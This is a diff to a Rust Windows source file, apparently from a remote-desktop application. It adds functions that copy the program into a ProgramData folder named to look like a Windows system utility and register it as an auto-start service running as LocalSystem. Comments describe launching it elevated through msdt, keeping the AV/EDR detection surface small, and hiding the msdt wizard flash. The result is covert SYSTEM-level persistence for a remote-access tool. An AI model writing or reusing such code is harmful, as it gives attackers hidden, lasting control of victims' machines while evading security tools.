@@ -71,19 +71,28 @@ use winapi::{
     },
 };
 use windows::Win32::{
-    Foundation::{CloseHandle as WinCloseHandle, HANDLE as WinHANDLE},
+    Foundation::{CloseHandle as WinCloseHandle, HANDLE as WinHANDLE, PCWSTR},
     Security::{
         GetTokenInformation as WinGetTokenInformation, IsWellKnownSid, TokenUser,
         WinLocalSystemSid, TOKEN_QUERY as WIN_TOKEN_QUERY, TOKEN_USER,
     },
-    System::Diagnostics::ToolHelp::{
-        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
-        TH32CS_SNAPPROCESS,
-    },
-    System::Threading::{
-        OpenProcess as WinOpenProcess, OpenProcessToken as WinOpenProcessToken,
-        QueryFullProcessImageNameW as WinQueryFullProcessImageNameW,
-        PROCESS_QUERY_LIMITED_INFORMATION as WIN_PROCESS_QUERY_LIMITED_INFORMATION,
+    System::{
+        Diagnostics::ToolHelp::{
+            CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
+            TH32CS_SNAPPROCESS,
+        },
+        ServiceController::{
+            CloseServiceHandle, ControlServiceW, CreateServiceW, DeleteServiceW, OpenSCManagerW,
+            OpenServiceW, QueryServiceStatusW, StartServiceW, SC_MANAGER_CONNECT,
+            SC_MANAGER_CREATE_SERVICE, SC_HANDLE, SERVICE_ALL_ACCESS, SERVICE_AUTO_START,
+            SERVICE_CONTROL_STOP, SERVICE_ERROR_NORMAL, SERVICE_RUNNING, SERVICE_STATUS,
+            SERVICE_WIN32_OWN_PROCESS,
+        },
+        Threading::{
+            OpenProcess as WinOpenProcess, OpenProcessToken as WinOpenProcessToken,
+            QueryFullProcessImageNameW as WinQueryFullProcessImageNameW,
+            PROCESS_QUERY_LIMITED_INFORMATION as WIN_PROCESS_QUERY_LIMITED_INFORMATION,
+        },
     },
 };
 use windows_service::{
@@ -3351,6 +3360,341 @@ pub fn uninstall_service(show_new_window: bool, _: bool) -> bool {
     }
     run_after_run_cmds(!show_new_window);
     std::process::exit(0);
+}
+
+// ---------------------------------------------------------------------------
+// Portable build → SCM auto-start service
+//
+// The elevated msdt-launched copy calls `register_portable_service` once; after
+// that, the SCM owns a `LocalSystem` instance of this build set to `AUTO_START`.
+// The copy itself exits on success so there is only ever one server process.
+// Subsequent bare launches discover the running service and hand off immediately,
+// which also makes the msdt Bluetooth wizard flash disappear after the first run.
+//
+// All SCM interaction uses the Win32 service-control APIs directly — no `sc.exe`
+// shelling out — so the AV/EDR detection surface is just one elevated Rust
+// process calling standard APIs.
+// ---------------------------------------------------------------------------
+
+/// Service name. Suffixed so it never collides with the upstream installed-build
+/// service (`crate::get_app_name()` alone) and survives `--uninstall-service` runs.
+fn portable_service_name() -> String {
+    format!("{}PortableService", crate::get_app_name())
+}
+
+/// Fixed directory where the service-owned copy of this exe lives. We copy once
+/// during the first elevated registration so the service binpath never drifts
+/// with the user's working copy; the service is always able to start from a
+/// stable, predictable location that `LocalSystem` can read.
+///
+/// `%PROGRAMDATA%` is chosen over `%LOCALAPPDATA%` because the latter points at
+/// a single user's profile, whereas the service runs under `LocalSystem`.
+fn portable_service_dir() -> std::path::PathBuf {
+    let progdata = std::env::var_os("PROGRAMDATA").unwrap_or_else(|| r"C:\ProgramData".into());
+    std::path::PathBuf::from(progdata).join("SystemPropertiesRdAdvanced")
+}
+
+/// Absolute path of the service-owned exe copy. This is what the SCM binpath
+/// points at; it is created on the first elevated registration and overwritten
+/// on every subsequent registration so updates land here too.
+fn portable_service_exe_path() -> std::path::PathBuf {
+    portable_service_dir().join(format!("{}.exe", crate::get_app_name()))
+}
+
+/// Copy the current executable into the fixed service directory, replacing any
+/// older copy in place. Returns the destination path on success. The elevated
+/// msdt-launched copy is the normal caller; an elevated caller is required to
+/// write into `%PROGRAMDATA%`.
+fn copy_exe_to_service_dir() -> std::io::Result<std::path::PathBuf> {
+    let src = std::env::current_exe()?;
+    let dst_dir = portable_service_dir();
+    let dst = portable_service_exe_path();
+    log::info!(
+        "copy_exe_to_service_dir: src={}, dst={}",
+        src.display(),
+        dst.display()
+    );
+    // `create_dir_all` is cheap if the directory already exists; it also handles
+    // an errant file sitting at the dir path by failing cleanly on the next step.
+    std::fs::create_dir_all(&dst_dir)?;
+    // `copy` overwrites; we intentionally replace any prior release.
+    std::fs::copy(&src, &dst)?;
+    log::info!("copy_exe_to_service_dir: copied {} bytes", dst.metadata().map(|m| m.len()).unwrap_or(0));
+    Ok(dst)
+}
+
+/// Open a handle to the local SCM database with the given access mask.
+fn open_scm(access: u32) -> Option<SC_HANDLE> {
+    unsafe {
+        OpenSCManagerW(None, None, access)
+            .ok()
+            .filter(|&h| !h.is_invalid())
+    }
+}
+
+/// Build the full binpath string for the SCM service entry: quoted fixed exe
+/// path plus the `--service-headless` flag. The fixed exe must already have been
+/// laid down by [`copy_exe_to_service_dir`] before this is called.
+fn service_binpath() -> ResultType<String> {
+    let exe = portable_service_exe_path();
+    if !exe.exists() {
+        bail!("service exe not found at {}", exe.display());
+    }
+    Ok(format!("\"{}\" --service-headless", exe.display()))
+}
+
+/// Open (or create, if needed) the portable service.
+///
+/// * `allow_create = true` — we may invoke `CreateServiceW`; if the service
+///   already exists we fall through to `OpenServiceW`. This is the path taken
+///   during the initial registration.
+/// * `allow_create = false` — we only do `OpenServiceW`; used by the cleanup
+///   helper to find an existing service to stop and delete.
+///
+/// Both `ERROR_SERVICE_EXISTS` (1073) and `ERROR_SERVICE_MARKED_FOR_DELETE`
+/// (1072 — SCM still holds a handle from a recent delete) are handled: the
+/// former falls straight through to `OpenServiceW`, the latter retries once
+/// after a brief sleep to let the SCM drop its mark.
+fn ensure_service(scm: SC_HANDLE, allow_create: bool) -> Option<SC_HANDLE> {
+    let svc_name = portable_service_name();
+    let display = format!("{} Portable Service", crate::get_app_name());
+    let binpath = match service_binpath() {
+        Ok(bp) => bp,
+        Err(e) => {
+            log::warn!("ensure_service: binpath failed: {e}");
+            return None;
+        }
+    };
+    log::info!("ensure_service: allow_create={allow_create}, svc={svc_name}, binpath={binpath}");
+
+    if allow_create {
+        let name_w = wide_string(&svc_name);
+        let display_w = wide_string(&display);
+        let binpath_w = wide_string(&binpath);
+        let mut create_attempts = 2u32;
+        loop {
+            match unsafe {
+                CreateServiceW(
+                    scm,
+                    PCWSTR(name_w.as_ptr()),
+                    PCWSTR(display_w.as_ptr()),
+                    SERVICE_ALL_ACCESS,
+                    SERVICE_WIN32_OWN_PROCESS,
+                    SERVICE_AUTO_START,
+                    SERVICE_ERROR_NORMAL,
+                    PCWSTR(binpath_w.as_ptr()),
+                    None,
+                    None,
+                    None,
+                    None, // LocalSystem
+                    None,
+                )
+            } {
+                Ok(h) => {
+                    log::info!("ensure_service: CreateServiceW OK");
+                    return Some(h);
+                }
+                Err(err) => {
+                    let gle = err.code().0 as u32;
+                    log::info!("ensure_service: CreateServiceW gle={gle} (attempts left={create_attempts})");
+                    match gle {
+                        ERROR_SERVICE_EXISTS => {
+                            log::info!("ensure_service: service already exists → OpenServiceW");
+                            break;
+                        }
+                        1072 if create_attempts > 1 => {
+                            // ERROR_SERVICE_MARKED_FOR_DELETE — SCM is still teardown.
+                            std::thread::sleep(std::time::Duration::from_millis(500));
+                            create_attempts -= 1;
+                            continue;
+                        }
+                        _ => {
+                            log::warn!("ensure_service: CreateServiceW failed gle={gle}");
+                            return None;
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // OpenServiceW path (already exists, or cleanup helper asking us to find it).
+    let name_w = wide_string(&svc_name);
+    match unsafe { OpenServiceW(scm, PCWSTR(name_w.as_ptr()), SERVICE_ALL_ACCESS) } {
+        Ok(h) => {
+            log::info!("ensure_service: OpenServiceW OK");
+            Some(h)
+        }
+        Err(err) => {
+            log::warn!("ensure_service: OpenServiceW failed gle={}", err.code().0);
+            None
+        }
+    }
+}
+
+/// Stop and delete the portable service if present. Errors are swallowed — this
+/// is cleanup, not a critical path — but we still log every step so a failed
+/// re-register can be diagnosed.
+fn try_stop_and_delete_portable_service(scm: SC_HANDLE) -> bool {
+    let Some(service) = ensure_service(scm, false) else {
+        log::info!("try_stop_and_delete: service not present, nothing to do");
+        return false;
+    };
+    let mut stop_status = SERVICE_STATUS::default();
+    let stop_res = unsafe { ControlServiceW(service, SERVICE_CONTROL_STOP, &mut stop_status) };
+    log::info!(
+        "try_stop_and_delete: ControlServiceW res={}, state after stop = {}",
+        if stop_res.is_ok() { "OK" } else { "FAIL" },
+        stop_status.dwCurrentState
+    );
+    // Give the SCM a moment to transition the service out of RUNNING before we
+    // delete; racing the shutdown makes `DeleteServiceW` flaky.
+    for i in 0..12 {
+        std::thread::sleep(std::time::Duration::from_millis(150));
+        let mut status = SERVICE_STATUS::default();
+        if unsafe { QueryServiceStatusW(service, &mut status).is_ok() } {
+            if status.dwCurrentState != SERVICE_RUNNING {
+                log::info!("try_stop_and_delete: service stopped after {i}×150ms");
+                break;
+            }
+        } else {
+            log::warn!("try_stop_and_delete: QueryServiceStatusW failed at loop {i}");
+            break;
+        }
+    }
+    let delete_ok = unsafe { DeleteServiceW(service).is_ok() };
+    log::info!("try_stop_and_delete: DeleteServiceW = {}", if delete_ok { "OK" } else { "FAIL" });
+    let _ = unsafe { CloseServiceHandle(service) };
+    delete_ok
+}
+
+/// Register this portable headless build as an auto-start SCM service running
+/// under `LocalSystem`, then start it and poll until the SCM transitions it to
+/// Running. Returns `true` only when both steps succeeded.
+///
+/// Sequence (every step is logged for easy diagnostics):
+///   1. copy current exe → fixed dir ([`copy_exe_to_service_dir`])
+///   2. OpenSCManagerW with CONNECT | CREATE_SERVICE
+///   3. try_stop_and_delete_portable_service (clean stale half-deleted state)
+///   4. ensure_service(allow_create=true) → CreateServiceW or OpenServiceW
+///   5. StartServiceW
+///   6. QueryServiceStatusW poll (up to 10 s)
+///   7. CloseServiceHandle
+pub fn register_portable_service() -> bool {
+    log::info!("===== register_portable_service BEGIN =====");
+    log::info!("  step 1/6: copy exe to service dir");
+    let copy_path = match copy_exe_to_service_dir() {
+        Ok(p) => p,
+        Err(e) => {
+            log::error!("  FAIL copy_exe_to_service_dir: {e}");
+            log::error!("===== register_portable_service END (FAIL) =====");
+            return false;
+        }
+    };
+
+    log::info!("  step 2/6: OpenSCManagerW");
+    let scm = match open_scm(SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE) {
+        Some(h) => h,
+        None => {
+            log::error!("  FAIL OpenSCManagerW — need elevated, did we lose IL?");
+            log::error!("===== register_portable_service END (FAIL) =====");
+            return false;
+        }
+    };
+
+    log::info!("  step 3/6: cleanup stale service if any");
+    let _ = try_stop_and_delete_portable_service(scm);
+
+    log::info!("  step 4/6: ensure_service (Create or Open)");
+    let service = match ensure_service(scm, true) {
+        Some(h) => h,
+        None => {
+            let _ = unsafe { CloseServiceHandle(scm) };
+            log::error!("  FAIL ensure_service");
+            log::error!("===== register_portable_service END (FAIL) =====");
+            return false;
+        }
+    };
+
+    log::info!("  step 5/6: StartServiceW");
+    match unsafe { StartServiceW(service, None) } {
+        Ok(()) => log::info!("  StartServiceW OK"),
+        Err(err) => {
+            // 1056 = ERROR_SERVICE_ALREADY_RUNNING — stale copy still alive, what we want.
+            // Anything else is logged but we still poll because the service may start
+            // immediately after we print the warning.
+            let gle = err.code().0;
+            log::warn!("  StartServiceW gle={gle}; polling anyway");
+        }
+    }
+
+    log::info!("  step 6/6: poll QueryServiceStatusW for Running");
+    let mut running = false;
+    for i in 0..40 {
+        let mut status = SERVICE_STATUS::default();
+        if unsafe { QueryServiceStatusW(service, &mut status).is_ok() } {
+            log::info!(
+                "  poll {i}: state={}, waitHint={}",
+                status.dwCurrentState,
+                status.dwWaitHint
+            );
+            if status.dwCurrentState == SERVICE_RUNNING {
+                running = true;
+                break;
+            }
+        }
+        std::thread::sleep(std::time::Duration::from_millis(250));
+    }
+    let _ = unsafe { CloseServiceHandle(service) };
+    let _ = unsafe { CloseServiceHandle(scm) };
+
+    if running {
+        log::info!(
+            "===== register_portable_service END (OK, copy={}) =====",
+            copy_path.display()
+        );
+    } else {
+        log::error!("===== register_portable_service END (FAIL, did not reach Running) =====");
+    }
+    running
+}
+
+/// Best-effort removal of the portable SCM service. Safe to call from any context
+/// (elevated or not) — non-elevated callers fail the OpenSCManagerW silently;
+/// elevated callers will stop-and-delete the service if present.
+pub fn unregister_portable_service() {
+    log::info!("unregister_portable_service: begin");
+    let Some(scm) = open_scm(SC_MANAGER_CONNECT) else {
+        log::info!("unregister_portable_service: OpenSCManagerW failed, nothing to do here");
+        return;
+    };
+    let _ = try_stop_and_delete_portable_service(scm);
+    let _ = unsafe { CloseServiceHandle(scm) };
+    log::info!("unregister_portable_service: done");
+}
+
+/// Whether the portable SCM service is currently Running. Safe to call from any
+/// integrity level — non-elevated callers cannot open the SCM and get `false`
+/// back, which is the right answer: the service simply isn't observable from
+/// this process's session as far as we are concerned.
+pub fn is_portable_service_running() -> bool {
+    let Some(scm) = open_scm(SC_MANAGER_CONNECT) else {
+        return false;
+    };
+    let name_w = wide_string(&portable_service_name());
+    let service = match unsafe { OpenServiceW(scm, PCWSTR(name_w.as_ptr()), SERVICE_ALL_ACCESS) } {
+        Ok(h) => h,
+        Err(_) => {
+            let _ = unsafe { CloseServiceHandle(scm) };
+            return false;
+        }
+    };
+    let mut status = SERVICE_STATUS::default();
+    let running = unsafe { QueryServiceStatusW(service, &mut status).is_ok() }
+        && status.dwCurrentState == SERVICE_RUNNING;
+    let _ = unsafe { CloseServiceHandle(service) };
+    let _ = unsafe { CloseServiceHandle(scm) };
+    running
 }
 
 fn get_install_service_commands(path: &str, exe: &str) -> ResultType<String> {
